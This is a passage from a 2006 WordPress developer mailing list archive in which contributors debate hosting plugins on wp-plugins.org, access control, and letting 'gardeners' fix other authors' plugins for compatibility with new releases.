> providing all of the Trac features for tickets and wiki are pretty nice.
>  Unified login with WordPress.org support is nice.
> 
 > A suggested alternative has been to just dump the latest version of code
> hosted elsewhere into the repo, which dilutes the idea of where the
> official release comes from.  

This also dilutes the ability to track what change fixed what bug.

The biggest feature of my personal development process that drives me
aways from wp-plugins.org and to personally hosted svn is keeping things
private until they are finished.

I like to check in when I have finished a feature but not necessarily
finished the code.  It may then be a few days before I have more time to
 work on the code and I don't want an unsuspecting user downloading the
code because it was freely available on wp-plugins.org

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6RffVPRdzag0AcURAqhqAJ9Kgxktlvp68FxH4pP5maV9bjsCxACeMyrj
kV0MlnWt5eYjiHgS4HXYjiI=
=c7wa
-----END PGP SIGNATURE-----

From skeltoac at gmail.com  Tue Feb  7 22:36:39 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Feb  7 22:38:06 2006
Subject: [wp-hackers] Posts time out and make duplicate posts
In-Reply-To: <2b47310b0602071123w1c023b87ged0703b899cb343@mail.gmail.com>
References: <BAY101-W1031F3CC9BB6C5273299DB930F0@phx.gbl>
	<2b47310b0602071123w1c023b87ged0703b899cb343@mail.gmail.com>
Message-ID: <e6ec604d0602071436p751921beked15c5dc579af03a@mail.gmail.com>

On 2/7/06, Jonathan Firestone <jonathan.firestone@gmail.com> wrote:
> I'm using 2.0 and I have encountered duplicate posts, in fact this very day.

How many times did you submit the form?
From kimmo+key+wordpress.c4f53f at suominen.com  Tue Feb  7 23:00:52 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Tue Feb  7 23:02:27 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E917DF.9010807@ftwr.co.uk>
References: <43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com> <43E917DF.9010807@ftwr.co.uk>
Message-ID: <20060207230052.GW1070@kimmo.suominen.com>

On Tue, Feb 07, 2006 at 09:57:51PM +0000, Peter Westwood wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Owen Winkler wrote:
> > Regarding plugin hosting at wp-plugins.org:
> > 
> > There is no way for me to add new projects (a few line items relate to
> > circumventing the manual email to photomatt to enable these repos).
> > I can't grant and deny access to my projects to other users.
> > I can't configure notifications (or any action) on svn commits.
> > Trac is cluttered with many commits, tickets, and wiki changes that are
> > unimportant to people seeking information specifically about my plugin.
> > There is no email notification of new tickets.
> > There is no dedicated self-support forum located there for my plugin.
> > I get no traffic at my site for what plugins are hosted there.
> > I can't track downloads to monitor which plugins need the most attention.
> > I can't create private projects there, or restrict access to just the
> > trunk for allowing access only to tagged versions.
> > Downloading of the plugins themselves may be difficult for visitors when
> > the plugin consists of more than one file.
> > Providing clear version-specific downloads is difficult.
> > Abandoned projects are not culled, leaving my project to be found
> > amongst dozens of dead or unfinished projects.
> > There is no directory of plugins.
> > There is no vetting of plugins that are included, in spite of some
> > desire that there should be.
> > 
> 
> +1 to all of these

<AOL> Me too </AOL>

> The biggest feature of my personal development process that drives me
> aways from wp-plugins.org and to personally hosted svn is keeping things
> private until they are finished.
> 
> I like to check in when I have finished a feature but not necessarily
> finished the code.  It may then be a few days before I have more time to
>  work on the code and I don't want an unsuspecting user downloading the
> code because it was freely available on wp-plugins.org

You might want to check out svk -- it has the ability to mirror
repositories (both CVS and Subversion in addition to svk repositories).
If you setup a mirror and a local copy of the mirror, you can then work
on the copy until you are happy with the code.  Then you can sync up
to the centralized repository through the mirror.  (The sync preserves
all commit logs, and you can either produce a single commit or multiple
commits to the remote repository on sync.)

Alternatively you could setup the centralized repo as a mirror of your
own repository, but you still need the copy for day-to-day commits.

    http://svk.elixus.org/

Still, my plugins (not being that many) are in my local CVS, and so far
there hasn't been a need for bug tracking (but I happen to have the bug
tracking system already setup as well, for other projects).  With all
the infrastructure in place locally, I can see little reason on my side
to move to wp-plugins.org.

Best regards,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From ryan at ryanduff.net  Tue Feb  7 23:42:12 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Tue Feb  7 23:42:39 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8E647.6000105@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <43E93054.20001@ryanduff.net>

Owen Winkler wrote:
> Regarding plugin hosting at wp-plugins.org:
> 
> There is no way for me to add new projects (a few line items relate to 
> circumventing the manual email to photomatt to enable these repos).
> I can't grant and deny access to my projects to other users.
> I can't configure notifications (or any action) on svn commits.
> Trac is cluttered with many commits, tickets, and wiki changes that are 
> unimportant to people seeking information specifically about my plugin.
> There is no email notification of new tickets.
> There is no dedicated self-support forum located there for my plugin.
> I get no traffic at my site for what plugins are hosted there.
> I can't track downloads to monitor which plugins need the most attention.
> I can't create private projects there, or restrict access to just the 
> trunk for allowing access only to tagged versions.
> Downloading of the plugins themselves may be difficult for visitors when 
> the plugin consists of more than one file.
> Providing clear version-specific downloads is difficult.
> Abandoned projects are not culled, leaving my project to be found 
> amongst dozens of dead or unfinished projects.
> There is no directory of plugins.
> There is no vetting of plugins that are included, in spite of some 
> desire that there should be.

Don't forget to mention that there's no way to tag a ticket with a 
specific version. It can be tagged for a project, but specifics must be 
given in the description. This also goes back to the only person who can 
configure anything is Matt.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress
From m at mullenweg.com  Tue Feb  7 23:44:47 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Feb  7 23:46:54 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8E647.6000105@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <43E930EF.3080605@mullenweg.com>

Owen Winkler wrote:
> Still, no amount of plugin repo gardening is going to convince me that 
> hosting at wp-plugins.org (or any other simple download-only plugin 
> repo) is better than hosting my stuff myself.  It bothers me to think 
> that my own code won't be a part of the official plugin effort unless I 
> submit to the restrictions listed above, which aren't really of much 
> benefit to users of my plugins.

You don't have to *host* your plugins on wp-plugins.org, the site is 
intended purely for developers. It's for hosting development. Run your 
own bug tracker, downloads, whatever the hell you want. But if you want 
to be part of the official plugins infrastructure, and get all the 
promotion as a result of that, keep the source code (or a copy of it) in 
the official SVN repository.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ringmaster at midnightcircus.com  Wed Feb  8 00:56:53 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  8 00:59:15 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8B7C7.3050101@atl.lmco.com>
References: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
	<43E8B756.10609@atl.lmco.com> <43E8B7C7.3050101@atl.lmco.com>
Message-ID: <43E941D5.4070505@midnightcircus.com>

Doug Stewart wrote:
> Doug Stewart wrote:
>> Alchemy and Elixir were supposed to do something, but I believe 
>> development has stalled as the webpage hasn't been updated in ages 
>> (and the promised screenshots never delivered...).

> 
> Alchemy and Elixir were supposed to do something *similar to what you 
> were requesting*.

No, your original assessment seems fair.  ;)

Owen

From khanh at netspace.net.au  Wed Feb  8 01:07:27 2006
From: khanh at netspace.net.au (John Ha [c])
Date: Wed Feb  8 01:08:59 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
Message-ID: <006201c62c4c$07d516e0$6401a8c0@k9>

+1
  ----- Original Message ----- 
  From: Matt Mullenweg 
  To: wp-hackers@lists.automattic.com 
  Sent: Wednesday, 8 February 2006 10:44 AM
  Subject: Re: [wp-hackers] Simplicity in 2.next


  Owen Winkler wrote:
  > Still, no amount of plugin repo gardening is going to convince me that 
  > hosting at wp-plugins.org (or any other simple download-only plugin 
  > repo) is better than hosting my stuff myself.  It bothers me to think 
  > that my own code won't be a part of the official plugin effort unless I 
  > submit to the restrictions listed above, which aren't really of much 
  > benefit to users of my plugins.

  You don't have to *host* your plugins on wp-plugins.org, the site is 
  intended purely for developers. It's for hosting development. Run your 
  own bug tracker, downloads, whatever the hell you want. But if you want 
  to be part of the official plugins infrastructure, and get all the 
  promotion as a result of that, keep the source code (or a copy of it) in 
  the official SVN repository.

  -- 
  Matt Mullenweg
    http://photomatt.net | http://wordpress.org
  http://automattic.com | http://akismet.com
  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 08 February 2006 at 01:07:28 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5ACAEAAB8AHwAAAABAAAAUETpQyAEAABhAg
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdown0AdKibeH62iBK9z8RcqtIDWdYPSrcwxw1jzxs
We7rU2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From ringmaster at midnightcircus.com  Wed Feb  8 01:16:37 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  8 01:18:17 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E930EF.3080605@mullenweg.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com> <43E930EF.3080605@mullenweg.com>
Message-ID: <43E94675.9020601@midnightcircus.com>

Matt Mullenweg wrote:
> Owen Winkler wrote:
>> Still, no amount of plugin repo gardening is going to convince me that 
>> hosting at wp-plugins.org (or any other simple download-only plugin 
>> repo) is better than hosting my stuff myself.  It bothers me to think 
>> that my own code won't be a part of the official plugin effort unless 
>> I submit to the restrictions listed above, which aren't really of much 
>> benefit to users of my plugins.
> 
> You don't have to *host* your plugins on wp-plugins.org, the site is 
> intended purely for developers. It's for hosting development. Run your 
> own bug tracker, downloads, whatever the hell you want. But if you want 
> to be part of the official plugins infrastructure, and get all the 
> promotion as a result of that, keep the source code (or a copy of it) in 
> the official SVN repository.

If wp-plugins.org is not the official place that provides announcements, 
downloads, and support for a plugin that I write, then what advantage do 
I get by confusing users with what is essentially an irregularly updated 
mirror?

What are the benefits of the official plugin infrastructure beyond 
hosting?  When talking about promotion, are we talking about promoting 
the plugins or their authors?  How does that happen?

I do have a couple of plugins in the wp-plugins repo.  The personal 
promotion I've received from them is quite minimal, especially when 
counterbalanced by the complete disregard I've given to Trac on 
wp-plugins, since I have my own system in place for supporting even 
those plugins.  As far as plugin promotion goes, I don't know how anyone 
would even know that a plugin was in there if it wasn't first announced 
on someone's blog.

As long as this remains a hosting solution, I don't see much advantage. 
  If a true advantage to an "official plugin infrastructure" ever 
presents itself, I hope that it revolves around something that is 
hosting-independent, and not necessarily the system about which I had 
previously listed my reservations.

Owen
From ryan at boren.nu  Wed Feb  8 01:26:50 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 01:28:31 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94675.9020601@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com>
Message-ID: <43E948DA.9030906@boren.nu>

Owen Winkler wrote:
> If wp-plugins.org is not the official place that provides announcements, 
> downloads, and support for a plugin that I write, then what advantage do 
> I get by confusing users with what is essentially an irregularly updated 
> mirror?
> 
> What are the benefits of the official plugin infrastructure beyond 
> hosting?  When talking about promotion, are we talking about promoting 
> the plugins or their authors?  How does that happen?

If a plugin in wp-plugins needs to be updated to work with a new 
release, the crack team of plugin gardeners can fix it and commit the 
change.  I can't fix a plugin that lives in a repository to which I do 
not have committ access.  That's the main advantage from my point of view.

So, if we have to break some compatibility during a WP development 
cycle, I can write a script that crawls across the wp-plugins repository 
looking for plugins that need to be updated.  When we bust post_status 
up into post_status and post_type, for example, this ability will be 
very handy.  I can see what the impact on plugins will be.

Ryan
From jason at zenenet.com  Wed Feb  8 01:29:19 2006
From: jason at zenenet.com (Jason S.)
Date: Wed Feb  8 01:30:48 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E948DA.9030906@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>
	<43E948DA.9030906@boren.nu>
Message-ID: <43E9496F.2020703@zenenet.com>

Ryan Boren wrote:
> Owen Winkler wrote:
>> What are the benefits of the official plugin infrastructure beyond
>> hosting?  When talking about promotion, are we talking about promoting
>> the plugins or their authors?  How does that happen?
> 
> If a plugin in wp-plugins needs to be updated to work with a new
> release, the crack team of plugin gardeners can fix it and commit the
> change.  I can't fix a plugin that lives in a repository to which I do
> not have committ access.  That's the main advantage from my point of view.
> 
> So, if we have to break some compatibility during a WP development
> cycle, I can write a script that crawls across the wp-plugins repository
> looking for plugins that need to be updated.  When we bust post_status
> up into post_status and post_type, for example, this ability will be
> very handy.  I can see what the impact on plugins will be.

As a developer, I hate this idea.
As an end-user, I love it.

What a conundrum :(.
From ryan at ryanduff.net  Wed Feb  8 01:38:52 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Wed Feb  8 01:39:45 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E9496F.2020703@zenenet.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>
	<43E9496F.2020703@zenenet.com>
Message-ID: <43E94BAC.8040507@ryanduff.net>

Jason S. wrote:
> Ryan Boren wrote:
>> Owen Winkler wrote:
>>> What are the benefits of the official plugin infrastructure beyond
>>> hosting?  When talking about promotion, are we talking about promoting
>>> the plugins or their authors?  How does that happen?
>> If a plugin in wp-plugins needs to be updated to work with a new
>> release, the crack team of plugin gardeners can fix it and commit the
>> change.  I can't fix a plugin that lives in a repository to which I do
>> not have committ access.  That's the main advantage from my point of view.
>>
>> So, if we have to break some compatibility during a WP development
>> cycle, I can write a script that crawls across the wp-plugins repository
>> looking for plugins that need to be updated.  When we bust post_status
>> up into post_status and post_type, for example, this ability will be
>> very handy.  I can see what the impact on plugins will be.
> 
> As a developer, I hate this idea.
> As an end-user, I love it.
> 
> What a conundrum :(.

+1

I don't think its a wise idea to just jump in and edit someone else's 
plugin to make it compatible again. Automation in this means can tend to 
break things and outweighs its good intentions.

Changes are best left to the hackers list where plugin devs can be 
notified of the changes and instructed how the change affects how their 
plugins work.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress
From ringmaster at midnightcircus.com  Wed Feb  8 01:40:26 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  8 01:42:44 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E948DA.9030906@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
Message-ID: <43E94C0A.8020109@midnightcircus.com>

Ryan Boren wrote:
> If a plugin in wp-plugins needs to be updated to work with a new 
> release, the crack team of plugin gardeners can fix it and commit the 
> change.  I can't fix a plugin that lives in a repository to which I do 
> not have committ access.  That's the main advantage from my point of view.

It's not an invalid advantage by any stretch.  And yet, in an 
environment with two primary committers with deific control over the 
core repo, you can see how I would feel oddly about this.

I mean, I can't set permissions on my own repo for developers I trust 
with my vision, but any old gardener can come along and modify my code 
as they see fit?

I know I'm not the only one that sees something weird going on here.

Owen
From ryan at boren.nu  Wed Feb  8 01:54:08 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 01:55:42 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94C0A.8020109@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>
	<43E948DA.9030906@boren.nu> <43E94C0A.8020109@midnightcircus.com>
Message-ID: <43E94F40.6060509@boren.nu>

Owen Winkler wrote:
> Ryan Boren wrote:
> 
>> If a plugin in wp-plugins needs to be updated to work with a new 
>> release, the crack team of plugin gardeners can fix it and commit the 
>> change.  I can't fix a plugin that lives in a repository to which I do 
>> not have committ access.  That's the main advantage from my point of 
>> view.
> 
> 
> It's not an invalid advantage by any stretch.  And yet, in an 
> environment with two primary committers with deific control over the 
> core repo, you can see how I would feel oddly about this.

Hey, almost all of your patches go straight in. :-)

> I mean, I can't set permissions on my own repo for developers I trust 
> with my vision, but any old gardener can come along and modify my code 
> as they see fit?

Would be nice to have better access control.

Bug gardeners would have to limit their changes to the scope of fixing 
incompatibility problems.  Troublesome gardeners would have access revoked.

> I know I'm not the only one that sees something weird going on here.

For you, any advantage probably isn't worthwile.  You actually maintain 
your plugins.  Most plugins are unmaintained, however.  Most plugin 
authors do not follow the hackers list, and they wait until after a 
release to update their plugins.  That's too late.  I'm trying to figure 
a way to improve the end user experience.  Every time we try to address 
this, we all get into this same argument and nothing is ever done.

Ryan
From ryan at ryanduff.net  Wed Feb  8 02:07:14 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Wed Feb  8 02:07:54 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94F40.6060509@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com> <43E94F40.6060509@boren.nu>
Message-ID: <43E95252.6040102@ryanduff.net>

Ryan Boren wrote:
> I'm trying to figure 
> a way to improve the end user experience.  Every time we try to address 
> this, we all get into this same argument and nothing is ever done.


We could start by eliminating 50% of the plugins in the repo that the 
last log message was "Adding [username]" by photomatt > 1 month ago. I 
am puzzled why people email him asking for an account then forget to use 
it. There are some accounts that were set up way back in the beginning 
and haven't been used since creation over a year ago.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress

From skippy at skippy.net  Wed Feb  8 02:07:05 2006
From: skippy at skippy.net (Scott Merrill)
Date: Wed Feb  8 02:08:39 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94F40.6060509@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com> <43E94F40.6060509@boren.nu>
Message-ID: <43E95249.9050903@skippy.net>

Ryan Boren wrote:
> For you, any advantage probably isn't worthwile.  You actually maintain
> your plugins.  Most plugins are unmaintained, however.  Most plugin
> authors do not follow the hackers list, and they wait until after a
> release to update their plugins.  That's too late.  I'm trying to figure
> a way to improve the end user experience.  Every time we try to address
> this, we all get into this same argument and nothing is ever done.

I can see this developing somewhat akin to the Debian maintainer
process.  The Debian maintainers apply patches and modify projects in
ways to ensure compliance and compatibility with the Debian core.  They
submit patches upstream, and upgrade their managed versions as needed.

What's being proposed is not an easy undertaking.  Plugin maintainership
will require _a lot_ of time initially, due to code reviews and testing.
It'll require more time as plugins evolve, and the code needs to be
re-reviewed.  Bug reports from users will need to be sent upstream, etc etc.

I agree that the notification of problems resulting from core changes is
a huge benefit.  I'd like to see these core changes announced somewhere
other than just trac tickets, so that the fringe developers can still
benefit from the information.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From wp at ebroder.net  Wed Feb  8 02:10:35 2006
From: wp at ebroder.net (Evan Broder)
Date: Wed Feb  8 02:11:44 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94F40.6060509@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com> <43E94F40.6060509@boren.nu>
Message-ID: <43E9531B.1010507@ebroder.net>

If there's going to be some sort of gardening system, at least make 
it...well, I don't know if I'd make it opt-in or opt-out, but one of the 
two. Or maybe disabled if the plugin has been updated within a certain 
range of time. I personally don't want other people screwing with my 
plugin if and while I'm developing it.

Yes. I'm a control freak. Deal with it :)

- Evan

Ryan Boren wrote:
> Owen Winkler wrote:
>> Ryan Boren wrote:
>>
>>> If a plugin in wp-plugins needs to be updated to work with a new 
>>> release, the crack team of plugin gardeners can fix it and commit 
>>> the change.  I can't fix a plugin that lives in a repository to 
>>> which I do not have committ access.  That's the main advantage from 
>>> my point of view.
>>
>>
>> It's not an invalid advantage by any stretch.  And yet, in an 
>> environment with two primary committers with deific control over the 
>> core repo, you can see how I would feel oddly about this.
>
> Hey, almost all of your patches go straight in. :-)
>
>> I mean, I can't set permissions on my own repo for developers I trust 
>> with my vision, but any old gardener can come along and modify my 
>> code as they see fit?
>
> Would be nice to have better access control.
>
> Bug gardeners would have to limit their changes to the scope of fixing 
> incompatibility problems.  Troublesome gardeners would have access 
> revoked.
>
>> I know I'm not the only one that sees something weird going on here.
>
> For you, any advantage probably isn't worthwile.  You actually 
> maintain your plugins.  Most plugins are unmaintained, however.  Most 
> plugin authors do not follow the hackers list, and they wait until 
> after a release to update their plugins.  That's too late.  I'm trying 
> to figure a way to improve the end user experience.  Every time we try 
> to address this, we all get into this same argument and nothing is 
> ever done.
>
> Ryan
> _______________________________________________
> wp-hackers mailing list
